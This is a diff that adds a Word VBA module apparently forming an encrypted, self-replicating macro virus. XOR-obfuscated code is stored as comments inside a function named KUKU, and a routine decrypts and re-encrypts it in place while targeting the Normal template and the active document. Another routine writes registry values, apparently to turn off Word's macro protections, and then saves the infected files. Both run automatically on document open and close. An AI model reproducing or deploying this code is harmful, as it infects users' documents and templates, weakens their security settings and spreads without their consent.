@@ -1,0 +1,67 @@
+Attribute VB_Name = "ThisDocument"
+Attribute VB_Base = "1Normal.ThisDocument"
+Attribute VB_GlobalNameSpace = False
+Attribute VB_Creatable = False
+Attribute VB_PredeclaredId = True
+Attribute VB_Exposed = True
+Attribute VB_TemplateDerived = True
+Attribute VB_Customizable = True
+'NVC
+Dim NT, AD
+Private Function KUKU() As Variant
+'B`/Uc`|f5Drklw~<S{g”
+'B~{y~|`:CemjJisi{|”ˆDXFW
+'B~{y~|`:Fwa}Wuiq|rO’“E[GX
+'Lm{ygwW{vcz}wn5Nx{/š6€…ˆ…„…ˆˆŠOMQB
+'L~|xqr`|yy6]shlqf!‡‘–FZH*€ˆœ›ƒ?‘
+'L~|xqr`|yy6\tz~q{\†ˆ.ƒHTJ[
+'L~|xqr`|yy6JrtkKwl•€!…–„-ƒŸƒŸNRPA
+'^k{0_F3)5Xxjt{wHxsoŒ€–†J3$7š†€™@922„š˜’–‰SMTP</%'+!3+-
+'^k{0PV3)5Wtlpl~Xr}j„Œ—J3$7š†€™@922„š˜’–‰SMTP</%'+!3+-
+'Dh/^E<_}{sd0(6;-4>#^A@D*3%EH=‚‚
+'-.\ueSg`g6YwkwzpI{rƒ—K ’„…$ŠˆBO@
+'-.AD?VvxpbrTpt~o=/3@/6M'Š“‰œ&Œ'…ƒ‹œ
+'-.AD?[}gpdcTpt~o=/3@ &M(Œˆ‚›A[GL,*A3‡€:;‘—ŸˆU
+'-.DEZG3)5'
+'Hb|uXt3UQ8[qwh4,2?QHB_ZED@&?)IL9†Š
+'-.\ueSg`g6V{msmyYq|•Œ‡K ’„…$ŠˆBO@
+'-.NT?VvxpbrTpt~o=/3@ &M'Š“‰œ&Œ'…ƒ‹œ
+'-.NT?[}gpdcTpt~o=/3@/6M(Œˆ‚›A[GL#:A3‡€:;‘—ŸˆU
+'-.DEZG3)5$
+'H`k0Xt
+'Dh/Ctq|zq>Ywn3;!=Sv”–†L+‰AI>ƒ‰ƒN"ƒ–0œŒUT.—Œˆ[Ÿ’“55'1dŒ(!-*>.(m,6pš‡˜wv|x/8˜.‘8‹€`KU_UANB_Œ…M†bWP@ZD›˜‹Š‹Ÿ’ŸöãÁñíñïäéå¦«®Ú·¸İ¿ÙÆßÀ¶á©·ª©¾
+End Function
+Private Function Cry(Ctr) As String
+On Error Resume Next
+For A = 1 To Len(Ctr)
+  S = S + Chr$(((Asc(Mid$(Ctr, A, 1)) - 32) Xor (A + 12)) + 32)
+Next A: Cry = S
+End Function
+Private Sub Cr(CC)
+On Error Resume Next
+Set MC = ThisDocument.VBProject.VBComponents(1).CodeModule
+If CC = 1 Then Set MC = NT
+If CC = 2 Then Set MC = AD
+If MC.Lines(1, 1) <> "'NVC" Then Exit Sub
+For J = MC.ProcBodyLine("KUKU", vbext_pk_Proc) + 1 To MC.CountOfLines
+  c = MC.Lines(J, 1)
+  If Mid$(c, 1, 5) = "End F" Then Exit For
+  If Mid$(c, 1, 1) = Chr(39) Then c = Cry(Mid$(c, 2, Len(c) - 1)) Else c = Chr(39) + Cry(Mid(c, 1, Len(c)))
+  MC.ReplaceLine J, c
+Next J
+End Sub
+Private Sub pp()
+On Error Resume Next
+System.PrivateProfileString("", Cry("EEJINQFFGSYLFOHYOBL/'64%7#;%€‰™ƒ‰„-=•’œ•’$HJUL!)2%!&35!=3"), Cry("IaadE`fga_ykm{wpxzY‰‡")) = 0
+System.PrivateProfileString("", Cry("EEJINQFFGSYLFOHYOBL/'64%7#;%€‰™ƒ‰„-=•’œ•’$HJUL!)2%!&35!=3"), Cry("Akyu}")) = 1
+System.PrivateProfileString("", Cry("EEJINQFFGSYLFOHYOBL/'64%7#;%€‰™ƒ‰„-=•’œ•’$HJUL!)2%!&35!=3"), Cry("LmlubaEVZ[")) = 1
+Cr (0): D = KUKU: Cr (0): If D <> 0 Then Cr (D)
+With ThisDocument: .Save: End With
+If D = 2 Then
+  With ActiveDocument: .Save: End With
+End If
+End Sub
+Private Sub Document_Open(): pp: End Sub
+Private Sub Document_Close(): pp: End Sub
+
+
